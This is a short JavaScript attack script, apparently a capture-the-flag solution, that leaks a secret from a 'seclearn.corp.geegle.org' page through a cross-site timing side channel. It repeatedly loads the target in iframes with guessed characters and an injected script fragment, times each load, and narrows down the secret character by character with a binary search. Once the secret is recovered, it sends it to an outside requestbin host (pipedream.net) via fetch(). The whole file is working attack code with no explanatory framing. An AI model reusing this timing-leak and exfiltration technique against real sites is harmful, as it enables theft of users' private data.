const threshold = 1200;
let charset = "abcdefghijklmnopqrstuvwxyz";
let flag = "";

window.addEventListener('load', () => {
  let result = [];
  let i = 0;
  console.log(location.href.split('?')[1]);
  const brute = (l, r, c) => {
    if (r < l) {
      console.log("Final: " + flag);
      fetch("https://envmf4tj6hwmi.x.pipedream.net/" + flag);
      console.log("exfiltrating to requestbin");
      return;
    }
    let go;
    let iframe = document.createElement('iframe');
    i = Math.floor((l + r) / 2);
    console.log(l+" "+r+" "+i+" "+charset[i]);
    iframe.src = "https://seclearn.corp.geegle.org/details/0?h=" + encodeURIComponent(flag + charset[i]) + "&h=~~~&h=~~~&h=~~~&h=~~~&w=%3Cscript%3Evar%20wordhistory%20=%20[%22" + encodeURIComponent(flag + charset[i]) +"%22";
    iframe.addEventListener('load', () => {
      document.body.removeChild(iframe);
      n = Date.now();
      console.log("time: " + (n - go));
      if (n - go < threshold) {
        if (l == r) {
          flag += charset[i];
          console.log("Current: " + flag);
          setTimeout(() => { brute(0, charset.length - 1, false); }, 100);
        } else if (r == l + 1){
          setTimeout(() => { brute(r , r, true); }, 100);
        } else {
          setTimeout(() => { brute(i , r, false); }, 100);
        }
      } else {
        if (l == r) {
          if (c) {
            flag += charset[i - 1];
            console.log("Current: " + flag);
            setTimeout(() => { brute(0, charset.length - 1, false); }, 100);
          } else {
            console.log("Final: " + flag);
            fetch("https://envmf4tj6hwmi.x.pipedream.net/" + flag);
            console.log("exfiltrating to requestbin");
            return;
          }
        } else {
          setTimeout(() => { brute(l, i - 1, false); }, 100);
        }
      }
    }, false);
    go = Date.now();
    document.body.appendChild(iframe);
  };
  brute(0, charset.length - 1);
}, false);
